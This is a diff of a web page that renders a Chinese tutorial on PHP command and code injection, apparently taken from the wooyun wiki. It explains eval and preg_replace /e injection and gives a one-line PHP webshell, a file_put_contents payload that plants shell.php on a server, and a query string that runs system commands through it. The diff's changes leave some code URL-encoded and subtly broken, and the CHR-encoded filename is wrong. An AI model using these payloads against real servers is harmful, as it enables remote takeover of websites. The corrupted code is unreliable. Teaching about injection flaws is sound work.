@@ -105,6 +105,9 @@ border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-te
     <div class="layout">
       <article class="article" itemscope itemtype="https://schema.org/TechArticle">
         
+<blockquote>
+<p>GitHub 仓库源文件：<a href="https://github.com/ben2023niao/ben-ops-notes/blob/main/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%96%87%E4%BB%B6%E4%B8%8E%E6%89%A7%E8%A1%8C%2BLinux%2BDNS-%E4%B8%80%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5.md" rel="noopener noreferrer">点击打开网页渲染版</a></p>
+</blockquote>
 <p>原文 by wooyun wiki</p>
 <h2 id="1-相关背景介绍">1、相关背景介绍</h2>
 <p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。 这里还是主要以PHP为主介绍命令执行漏洞，Java等应用的细节待补充。</p>
@@ -199,7 +202,7 @@ eval("\$ret = deal("$data");");
 
 preg_replace('/&lt;data&gt;(.*)&lt;/data&gt;/e', '$ret = "\\1";');
 
-preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
+preg_replace("/\s*\[php\](.%2B%3F)\[\/php\]\s*/ies", "\\1", $_GET['h']);
 ?&gt;
 </code></pre>
 <p>第一个就是刚才之前说phpcms 的，通常$data不会直接来自POST或GET变量（要不也太水了），但通过一些二次漏洞很可能能够造出代码执行（如SQL注入）。 第二个是将$data使用一个函数（deal）处理后再赋值给$ret。那么，传参的方式就很重要了。第二个用的是单引号传参，那么我们只能先闭合单引号，之后才能注入代码。如果应用全局做了addslashes或GPC=on的话，就不能够注入代码了。 第三个与第二个类似，但使用的是双引号传参。双引号在代码中有个很重要的特性，它能解析其中的函数，如我们传入<code>${phpinfo()}</code>，phpinfo将会被执行，而得到的返回值作为参数传入deal 函数。这个时候，我们就不用考虑闭合引号的事了。 第四个是preg_replace函数的误用，这种用法出现的情况是最多的，也是因为preg_replace第二个参数中，包裹正则结果\\1的是双引号，通过第三个中的方式，也能执行任意代码。
@@ -211,8 +214,8 @@ preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
 <p>由于 $menu 不为空，如果 <code>menu=phpinfo(); exit();</code>   内部执行 string2array 函数，</p>
 <p><code>eval("\$arr=$data");</code> 时会 执行命令，即 <code>eval("\$arr=phpinfo();exit();");</code></p>
 <p>进一步地，我们可以将一句话木马写成 webshell 文件放到网站服务器目录下</p>
-<p>一句话木马  <code>&lt;?php eval($_GET['func']($_GET['cmd'])); ?&gt;</code></p>
-<p><code>menu=file_put_contents('shell.php', ' &lt;?php eval($_GET['func']($_GET['cmd'])); ?&gt; ')</code></p>
+<p>一句话木马  <code>&lt;?php eval($_GET['func'](%24_GET%5B%27cmd%27%5D)); ?&gt;</code></p>
+<p><code>menu=file_put_contents('shell.php', ' &lt;?php eval($_GET['func'](%24_GET%5B%27cmd%27%5D)); ?&gt; ')</code></p>
 <p>为了防止转义等导致命令执行不成功，可以用 ascii 码形式，即</p>
 <p><code>index.php?userid=abc&amp;menu=file_put_contents(CHR(115).CHR(104).CHR(101).CHR(108).CHR(108).CHR(42).CHR(112).CHR(104).CHR(112), ...);exit()</code></p>
 <p>下次我们可以直接访问 <code>shell.php?func=system&amp;cmd=dir</code>，执行php 代码 <code>system(dir)</code>。</p>
